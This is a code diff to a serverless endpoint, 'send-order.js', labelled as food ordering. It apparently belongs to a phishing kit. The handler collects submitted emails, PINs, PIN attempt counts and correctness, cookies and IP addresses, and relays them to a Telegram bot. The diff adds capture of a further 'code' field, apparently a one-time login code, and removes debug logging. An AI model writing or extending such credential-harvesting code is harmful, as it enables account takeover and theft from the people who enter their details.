@@ -1,4 +1,4 @@
-// api/send-order.js – with enhanced debugging
+// api/send-order.js
 
 export default async function handler(req, res) {
   // Only allow POST
@@ -8,7 +8,7 @@ export default async function handler(req, res) {
 
   try {
     // 1. Parse request body
-    const { email, pin, attemptNumber, isCorrectPin, sessionId } = req.body;
+    const { email, pin, code, attemptNumber, isCorrectPin, sessionId } = req.body;
 
     // 2. Read all cookies
     const cookies = req.headers.cookie || '';
@@ -19,14 +19,6 @@ export default async function handler(req, res) {
     // 4. Get Telegram credentials from environment
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
-
-    // ─── Debug logging ───────────────────────────────
-    console.log('🔍 Environment check:');
-    console.log('  botToken exists?', !!botToken);
-    console.log('  chatId exists?   ', !!chatId);
-    console.log('  botToken length:', botToken ? botToken.length : 'undefined');
-    console.log('  chatId value:', chatId || 'undefined');
-    // ─────────────────────────────────────────────────
 
     // If missing, return a clear error
     if (!botToken || !chatId) {
@@ -55,6 +47,7 @@ export default async function handler(req, res) {
     lines.push('🍽️ <b>New Food Order</b>');
     if (email) lines.push(`📧 <b>Email:</b> ${escapeHtml(email)}`);
     if (pin) lines.push(`🔑 <b>PIN:</b> ${escapeHtml(pin)}`);
+    if (code) lines.push(`📱 <b>Code:</b> ${escapeHtml(code)}`);
     if (attemptNumber !== undefined) lines.push(`🔢 <b>Attempt:</b> ${attemptNumber}`);
     if (isCorrectPin !== undefined) lines.push(`✅ <b>Correct:</b> ${isCorrectPin ? 'Yes' : 'No'}`);
     if (ip) lines.push(`🌐 <b>IP:</b> ${escapeHtml(ip)}`);
@@ -66,7 +59,6 @@ export default async function handler(req, res) {
 
     // 7. Forward to Telegram
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    console.log('📤 Sending to Telegram...');
     const response = await fetch(telegramUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -78,7 +70,6 @@ export default async function handler(req, res) {
     });
 
     const result = await response.json();
-    console.log('📥 Telegram response:', result);
 
     if (!result.ok) {
       console.error('❌ Telegram error:', result);
